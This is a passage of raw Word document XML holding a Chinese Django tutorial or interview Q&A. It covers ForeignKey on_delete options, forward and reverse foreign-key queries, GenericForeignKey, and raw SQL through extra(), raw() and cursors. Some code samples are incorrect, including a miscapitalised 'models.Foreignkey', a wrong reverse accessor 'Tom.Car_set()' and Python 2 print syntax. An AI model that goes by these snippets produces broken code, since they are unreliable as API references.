      <w:r w:rsidRPr="006C4F65">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>约束，将定义有外键的模型对象同时删除！（该操作为当前</w:t>
      </w:r>
      <w:r w:rsidRPr="006C4F65">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidRPr="006C4F65">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>版本的默认操作！）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5383FF34" w14:textId="77777777" w:rsidR="006C4F65"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PROTECT</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41B42CBE" w14:textId="675C1AFB" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="006C4F65">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:before="150" w:after="150" w:line="300" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006C4F65">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>阻止上面的删除操作，但是弹出</w:t>
      </w:r>
      <w:r w:rsidRPr="006C4F65">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>ProtectedError</w:t>
      </w:r>
      <w:r w:rsidRPr="006C4F65">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>异常</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="480C2C6F" w14:textId="77777777" w:rsidR="006C4F65"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SET_NULL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38253B9B" w14:textId="09E2420A" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="006C4F65">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:before="150" w:after="150" w:line="300" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006C4F65">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>代表父表（少类表）被删除后子表（多类表）对应的外键字段会设置为</w:t>
      </w:r>
      <w:r w:rsidRPr="006C4F65">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>null</w:t>
      </w:r>
      <w:r w:rsidRPr="006C4F65">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，只有当字段设置了</w:t>
      </w:r>
      <w:r w:rsidRPr="006C4F65">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>null=True</w:t>
      </w:r>
      <w:r w:rsidRPr="006C4F65">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidRPr="006C4F65">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>blank=True</w:t>
      </w:r>
      <w:r w:rsidRPr="006C4F65">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>时，方可使用该值。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="381BEAD8" w14:textId="77777777" w:rsidR="006C4F65"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SET_DEFAULT</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="076C8733" w14:textId="16117E03" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="006C4F65">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:before="150" w:after="150" w:line="300" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006C4F65">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>代表父表（少类表）被删除后子表（多类表）对应的外键字段会设置为默认值。只有当字段设置了</w:t>
      </w:r>
      <w:r w:rsidRPr="006C4F65">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>default</w:t>
      </w:r>
      <w:r w:rsidRPr="006C4F65">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>参数时，方可使用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E43D43C" w14:textId="77777777" w:rsidR="006C4F65"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DO_NOTHING</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="698B537E" w14:textId="220D2B53" w:rsidR="00024E97" w:rsidRPr="006C4F65" w:rsidRDefault="00024E97" w:rsidP="006C4F65">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6C4F65">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>什么也不做，一切看数据库级别的约束</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="057B6EAB" w14:textId="77777777" w:rsidR="006C4F65"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SET()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="210EE9CF" w14:textId="3B31EDC5" w:rsidR="00024E97" w:rsidRPr="006C4F65" w:rsidRDefault="00024E97" w:rsidP="006C4F65">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6C4F65">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>设置为一个传递给</w:t>
      </w:r>
      <w:r w:rsidRPr="006C4F65">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>SET()</w:t>
      </w:r>
      <w:r w:rsidRPr="006C4F65">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的值或者一个回调函数的返回值。注意大小写，用得很少。</w:t>
      </w:r>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
    </w:p>
    <w:p w14:paraId="542C664A"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09.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>如何通过外键，子表查询父表和父表查询子表</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="465D18A6"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父表和子表关系如下：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C87642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from django.db import models</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71193F4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Person(models.Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="709E237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name = models.CharField(max_length=64)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DC2A85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age = models.IntegerField()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FC159B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tel = models.CharField(max_length=64)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="279C87C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@property</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B12524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def all_cars(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48EC793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返回全部信息</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>'''</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32F2142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return self.cars.all()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BFB333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@property</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EE7CCA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def info(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DA2BAB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返回部分信息</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>'''</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46E20A7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return '%s %s' % (self.name, self.tel)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68B79CF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Car(models.Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="670CA81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owner = models.Foreignkey(Person, related_name='cars')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B9A1CD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name = models.CharField(max_length=64)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1251B98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price = models.FloatField()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6446495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子表查询父表</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7777EF9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car = Car.objects.get(id=1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F2F1FB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查询该车的车主</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DDF86D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owner = car.owner</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6343DEA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父表查询子表</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DC0DD7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 = Person.objects.get(id=1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AFD1EA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查询此人有多少车</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B8DF99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 xml:space="preserve"># </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>方式一</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20ADA2B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Django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>默认每个主表对象都有一个外键的属性，可以通过它来查询所有属于主表的子表信息</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40477C6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查询方式：主表</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>子表</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>_set()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，返回值为一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>queryset</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="117B566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Tom.Car_set().all()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43AF6E7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方式二：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C2E718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通过在外键中设置</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>related_name</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>属性值既可</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CC6F44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Tom.cars.all()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="579641A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方式三：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A607E4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通过</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>@property</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>装饰器在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>model</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>中预定义方法实现</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22DA2E6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Tom.all_cars</w:t>
      </w:r>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
    </w:p>
    <w:p w14:paraId="27323A59" w14:textId="28E59F07" w:rsidR="00024E97" w:rsidRDefault="00FC55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010</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谈谈</w:t>
      </w:r>
      <w:r w:rsidR="00024E97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t xml:space="preserve"> GenericForeignkey </w:t>
      </w:r>
      <w:r w:rsidR="00024E97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidR="00024E97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t xml:space="preserve"> GenericRelation </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CF52C8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GenericForeignkey </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> GenericRelation </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的方法能够解决多外键的表单产生的大量沉余数据。通过</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ContentType</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的查询，起到一个自动一对多的作用，能和任何模型都能连接起来，保证了代码的干净。避免了创建大量无用的空数据，有效减少存储空间和服务器压力。</w:t>
      </w:r>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
    </w:p>
    <w:p w14:paraId="74B9A907" w14:textId="4ADE790C" w:rsidR="00024E97" w:rsidRDefault="00FC55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011</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django</w:t>
      </w:r>
      <w:r w:rsidR="00024E97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>中怎么写原生</w:t>
      </w:r>
      <w:r w:rsidR="00024E97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11967306"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中级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SQL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53C75BDC" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="89"/>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使用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>extra</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="221BE6F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查询人民邮电出版社出版并且价格大于</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>50</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>元的书籍</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2378FFC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Book.objects.filter(publisher__name='</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>人民邮电出版社</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">').extra(where=['price&gt;50']) </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73F951E7" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">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使用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>raw</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EC7F83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books=Book.objects.raw('select * from hello_book')  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="188B169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for book in books:  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AEECEA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print book</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="267A2200" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="91"/>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使用游标</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36772B3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from django.db import connection  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14C1FFA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 = connection.cursor() </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71796A4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cursor.execute("insert into hello_author(name) values ('</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>特朗普</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>')"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59EE2F7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cursor.execute("update hello_author set name='</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
